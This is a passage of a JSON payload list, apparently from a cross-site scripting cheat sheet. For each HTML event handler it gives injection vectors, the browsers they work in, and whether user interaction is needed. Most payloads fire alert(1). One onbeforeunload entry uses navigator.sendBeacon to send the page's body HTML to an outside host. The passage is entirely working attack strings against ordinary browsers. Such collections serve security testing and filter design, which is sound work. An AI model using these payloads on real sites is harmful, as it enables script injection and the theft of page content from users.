                        "code": "<xmp onbeforecut=\"alert(1)\" contenteditable>test<\/xmp>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onbeforeinput": {
                "description": "Fires when the value of the element is about to be modified",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* contenteditable onbeforeinput=alert(1)>test",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onbeforeprint": {
                "description": "Fires before the page is printed",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body onbeforeprint=console.log(1)>",
                        "browsers": [
                            "chrome",
                            "firefox"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onbeforescriptexecute": {
                "description": "Fires before script is executed",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onbeforescriptexecute=alert(1)><script>1<\/script>",
                        "browsers": [
                            "firefox"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onbeforetoggle": {
                "description": "Fires before the a popop element is toggled",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<button popovertarget=x>Click me<\/button><* onbeforetoggle=alert(1) popover id=x>XSS<\/*>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onbeforeunload": {
                "description": "Fires after if the url changes",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body onbeforeunload=navigator.sendBeacon('\/\/https:\/\/ssl.example.com\/', document.body.innerHTML)>",
                        "browsers": [
                            "chrome",
                            "firefox"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onbegin": {
                "description": "Fires when a svg animation begins",
                "tags": [
                    {
                        "tag": "animatemotion",
                        "code": "<svg><path><animateMotion onbegin=alert(1) dur=\"1s\" repeatCount=\"1\">",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "animatetransform",
                        "code": "<svg><animatetransform onbegin=alert(1) attributeName=transform>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "set",
                        "code": "<svg><set onbegin=alert(1) attributename=x dur=1s>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "animate",
                        "code": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onblur": {
                "description": "Fires when an element loses focus",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onblur=alert(1) id=x tabindex=1 style=display:block>test<\/*><input value=clickme>",
                        "browsers": [
                            "chrome",
                            "safari",
                            "firefox"
                        ],
                        "interaction": true,
                        "hash": "#x"
                    }
                ]
            },
            "onbounce": {
                "description": "Fires when the marquee bounces",
                "tags": [
                    {
                        "tag": "marquee",
                        "code": "<marquee width=1 loop=1 onbounce=alert(1)>XSS<\/marquee>",
                        "browsers": [
                            "firefox"
                        ],
                        "interaction": false
                    }
                ]
            },
            "oncanplay": {
                "description": "Fires if the resource can be played",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video oncanplay=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "audio",
                        "code": "<audio oncanplay=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "oncanplaythrough": {
                "description": "Fires when enough data has been loaded to play the resource all the way through",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video oncanplaythrough=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onchange": {
                "description": "Requires as change of value",
                "tags": [
                    {
                        "tag": "input",
                        "code": "<input onchange=alert(1) value=xss>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "textarea",
                        "code": "<textarea onchange=alert(1)>XSS<\/textarea>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "select",
                        "code": "<select onchange=alert(1)><option>change me<\/option><option>XSS<\/option><\/select>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onclick": {
                "description": "Requires a click of the element",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onclick=\"alert(1)\" style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onclose": {
                "description": "Fires when a dialog is closed",
                "tags": [
                    {
                        "tag": "dialog",
                        "code": "<dialog open onclose=alert(1)><form method=dialog><button>XSS<\/button><\/form>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "oncontextmenu": {
                "description": "Triggered when right clicking to show the context menu",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* oncontextmenu=\"alert(1)\" style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "oncopy": {
                "description": "Requires you copy a piece of text",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* oncopy=alert(1) value=\"XSS\" autofocus tabindex=1 style=display:block>test",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "oncuechange": {
                "description": "Fires when subtitle changes",
                "tags": [
                    {
                        "tag": "track",
                        "code": "<video controls><source src=validvideo.mp4 type=video\/mp4><track default oncuechange=alert(1) src=\"data:text\/vtt,WEBVTT FILE\n\n1\n00:00:00.000 --> 00:00:05.000 \n<b>XSS<\/b>\n\"><\/video>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": false
                    }
                ]
            },
            "oncut": {
                "description": "Requires you cut a piece of text",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* oncut=alert(1) value=\"XSS\" autofocus tabindex=1 style=display:block>test",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "ondblclick": {
                "description": "Triggered when double clicking the element",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* ondblclick=\"alert(1)\" autofocus tabindex=1 style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "ondrag": {
                "description": "Triggered dragging the element",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* draggable=\"true\" ondrag=\"alert(1)\" style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "ondragend": {
                "description": "Triggered dragging is finished on the element",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* draggable=\"true\" ondragend=\"alert(1)\" style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "ondragenter": {
                "description": "Requires a mouse drag",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* draggable=\"true\" ondragenter=\"alert(1)\" style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "ondragexit": {
                "description": "Triggered when dragging the element",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* draggable=\"true\" ondragexit=\"alert(1)\" style=display:block>test<\/*>",
                        "browsers": [
                            "firefox"
                        ],
                        "interaction": true
                    }
                ]
            },
            "ondragleave": {
                "description": "Requires a mouse drag",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* draggable=\"true\" ondragleave=\"alert(1)\" style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "ondragover": {
                "description": "Triggered dragging over an element",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<div draggable=\"true\" contenteditable>drag me<\/div><* ondragover=alert(1) contenteditable style=display:block>drop here<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "ondragstart": {
                "description": "Requires a mouse drag",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* draggable=\"true\" ondragstart=\"alert(1)\" style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "ondrop": {
                "description": "Triggered dropping a draggable element",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<div draggable=\"true\" contenteditable>drag me<\/div><* ondrop=alert(1) contenteditable style=display:block>drop here<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "ondurationchange": {
                "description": "Fires when duration changes",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video controls ondurationchange=alert(1)><source src=validvideo.mp4 type=video\/mp4><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "audio",
                        "code": "<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio\/mpeg><\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onend": {
                "description": "Fires when a svg animation ends",
                "tags": [
                    {
                        "tag": "animate",
                        "code": "<svg><animate onend=alert(1) attributeName=x dur=1s>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "animatemotion",
                        "code": "<svg><path><animateMotion onend=alert(1) dur=1s repeatCount=1>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "animatetransform",
                        "code": "<svg><animatetransform onend=alert(1) attributeName=transform dur=1s>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "set",
                        "code": "<svg><set onend=alert(1) attributename=x dur=1s>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onended": {
                "description": "Fires when the resource is finished playing",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video controls autoplay onended=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "audio",
                        "code": "<audio controls autoplay onended=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onerror": {
                "description": "Fires when the resource fails to load or causes an error",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body onerror=alert(1) onload=\/>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "script",
                        "code": "<script onerror=alert(1) src=\/><\/script>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "link",
                        "code": "<link rel=stylesheet href=1 onerror=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "img",
                        "code": "<img src\/onerror=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "img2",
                        "code": "<img srcset=1 onerror=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "image",
                        "code": "<image src\/onerror=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "image2",
                        "code": "<image srcset=1 onerror=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "image3",
                        "code": "<svg><image href=1 onerror=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "input",
                        "code": "<input type=image src=1 onerror=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "video",
                        "code": "<video src\/onerror=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "source",
                        "code": "<video><source onerror=alert(1) src=1><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "audio",
                        "code": "<audio src\/onerror=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "object",
                        "code": "<object onerror=alert(1) data=1 type=image\/gif>",
                        "browsers": [
                            "firefox"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "embed",
                        "code": "<embed src=1 onerror=alert(1) type=image\/gif>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onfinish": {
                "description": "Fires when the marquee finishes",
                "tags": [
                    {
                        "tag": "marquee",
                        "code": "<marquee width=1 loop=1 onfinish=alert(1)>XSS<\/marquee>",
                        "browsers": [
                            "firefox"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onfocus": {
                "description": "Fires when the element has focus",
                "tags": [
                    {
                        "tag": "input",
                        "code": "<input autofocus onfocus=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "select",
                        "code": "<select autofocus onfocus=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "textarea",
                        "code": "<textarea autofocus onfocus=alert(1)>test<\/textarea>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "button",
                        "code": "<button autofocus onfocus=alert(1)>test<\/button>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "input2",
                        "code": "<input id=x onfocus=alert(1)>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "input3",
                        "code": "<input type=checkbox id=x onfocus=alert(1)>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "input4",
                        "code": "<input type=radio id=x onfocus=alert(1)>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "area",
                        "code": "<img usemap=#x><map name=\"x\"><area href onfocus=alert(1) id=x>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "iframe",
                        "code": "<iframe id=x onfocus=alert(1)>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "iframe2",
                        "code": "<iframe autofocus onfocus=alert(1)>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "frame",
                        "code": "<frameset><frame id=x onfocus=alert(1)>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": false,
                        "hash": "#x",
                        "context": "before_body"
                    },
                    {
                        "tag": "embed",
                        "code": "<embed id=x onfocus=alert(1) type=text\/html>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "object",
                        "code": "<object id=x onfocus=alert(1) type=text\/html>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "svg",
                        "code": "<svg id=x onfocus=alert(1)>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "keygen",
                        "code": "<keygen id=x onfocus=alert(1)>",
                        "browsers": [
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "video",
                        "code": "<video id=x controls onfocus=alert(1)><source src=\"validvideo.mp4\" type=video\/mp4><\/video>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "video2",
                        "code": "<video controls src=1 onfocus=alert(1) autofocus>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "audio",
                        "code": "<audio id=x controls onfocus=alert(1) id=x><source src=\"validaudio.wav\"><\/audio>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "audio2",
                        "code": "<audio controls src=1 onfocus=alert(1) autofocus>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "link",
                        "code": "<link onfocus=alert(1) id=x tabindex=1 style=display:block>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "keygen",
                        "code": "<keygen autofocus onfocus=alert(1)>",
                        "browsers": [
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "a",
                        "code": "<a id=x tabindex=1 onfocus=alert(1)><\/a>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "a2",
                        "code": "<a autofocus onfocus=alert(1) href><\/a>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "abbr",
                        "code": "<abbr id=x tabindex=1 onfocus=alert(1)><\/abbr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "acronym",
                        "code": "<acronym id=x tabindex=1 onfocus=alert(1)><\/acronym>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "address",
                        "code": "<address id=x tabindex=1 onfocus=alert(1)><\/address>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "applet",
                        "code": "<applet id=x tabindex=1 onfocus=alert(1)><\/applet>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "article",
                        "code": "<article id=x tabindex=1 onfocus=alert(1)><\/article>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "aside",
                        "code": "<aside id=x tabindex=1 onfocus=alert(1)><\/aside>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "b",
                        "code": "<b id=x tabindex=1 onfocus=alert(1)><\/b>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "bdi",
                        "code": "<bdi id=x tabindex=1 onfocus=alert(1)><\/bdi>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "bdo",
                        "code": "<bdo id=x tabindex=1 onfocus=alert(1)><\/bdo>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "big",
                        "code": "<big id=x tabindex=1 onfocus=alert(1)><\/big>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "blink",
                        "code": "<blink id=x tabindex=1 onfocus=alert(1)><\/blink>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "blockquote",
                        "code": "<blockquote id=x tabindex=1 onfocus=alert(1)><\/blockquote>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "body",
                        "code": "<body id=x tabindex=1 onfocus=alert(1)><\/body>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "br",
                        "code": "<br id=x tabindex=1 onfocus=alert(1)><\/br>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "canvas",
                        "code": "<canvas id=x tabindex=1 onfocus=alert(1)><\/canvas>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "caption",
                        "code": "<caption id=x tabindex=1 onfocus=alert(1)><\/caption>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "center",
                        "code": "<center id=x tabindex=1 onfocus=alert(1)><\/center>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "cite",
                        "code": "<cite id=x tabindex=1 onfocus=alert(1)><\/cite>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "code",
                        "code": "<code id=x tabindex=1 onfocus=alert(1)><\/code>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "col",
                        "code": "<col id=x tabindex=1 onfocus=alert(1)><\/col>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "colgroup",
                        "code": "<colgroup id=x tabindex=1 onfocus=alert(1)><\/colgroup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "command",
                        "code": "<command id=x tabindex=1 onfocus=alert(1)><\/command>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "content",
                        "code": "<content id=x tabindex=1 onfocus=alert(1)><\/content>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "data",
                        "code": "<data id=x tabindex=1 onfocus=alert(1)><\/data>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "datalist",
                        "code": "<datalist id=x tabindex=1 onfocus=alert(1)><\/datalist>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "dd",
                        "code": "<dd id=x tabindex=1 onfocus=alert(1)><\/dd>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "del",
                        "code": "<del id=x tabindex=1 onfocus=alert(1)><\/del>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "details",
                        "code": "<details id=x tabindex=1 onfocus=alert(1)><\/details>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "dfn",
                        "code": "<dfn id=x tabindex=1 onfocus=alert(1)><\/dfn>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "dialog",
                        "code": "<dialog id=x tabindex=1 onfocus=alert(1)><\/dialog>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "dir",
                        "code": "<dir id=x tabindex=1 onfocus=alert(1)><\/dir>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "div",
                        "code": "<div id=x tabindex=1 onfocus=alert(1)><\/div>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "dl",
                        "code": "<dl id=x tabindex=1 onfocus=alert(1)><\/dl>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "dt",
                        "code": "<dt id=x tabindex=1 onfocus=alert(1)><\/dt>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "element",
                        "code": "<element id=x tabindex=1 onfocus=alert(1)><\/element>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "em",
                        "code": "<em id=x tabindex=1 onfocus=alert(1)><\/em>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "fieldset",
                        "code": "<fieldset id=x tabindex=1 onfocus=alert(1)><\/fieldset>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "figcaption",
                        "code": "<figcaption id=x tabindex=1 onfocus=alert(1)><\/figcaption>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "figure",
                        "code": "<figure id=x tabindex=1 onfocus=alert(1)><\/figure>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "font",
                        "code": "<font id=x tabindex=1 onfocus=alert(1)><\/font>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "footer",
                        "code": "<footer id=x tabindex=1 onfocus=alert(1)><\/footer>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "form",
                        "code": "<form id=x tabindex=1 onfocus=alert(1)><\/form>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "frameset",
                        "code": "<frameset id=x tabindex=1 onfocus=alert(1)><\/frameset>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x",
                        "context": "before_body"
                    },
                    {
                        "tag": "h1",
                        "code": "<h1 id=x tabindex=1 onfocus=alert(1)><\/h1>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "head",
                        "code": "<head id=x tabindex=1 onfocus=alert(1) style=display:block><\/head>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "header",
                        "code": "<header id=x tabindex=1 onfocus=alert(1)><\/header>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "hgroup",
                        "code": "<hgroup id=x tabindex=1 onfocus=alert(1)><\/hgroup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "hr",
                        "code": "<hr id=x tabindex=1 onfocus=alert(1)><\/hr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "html",
                        "code": "<html id=x tabindex=1 onfocus=alert(1)><\/html>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "i",
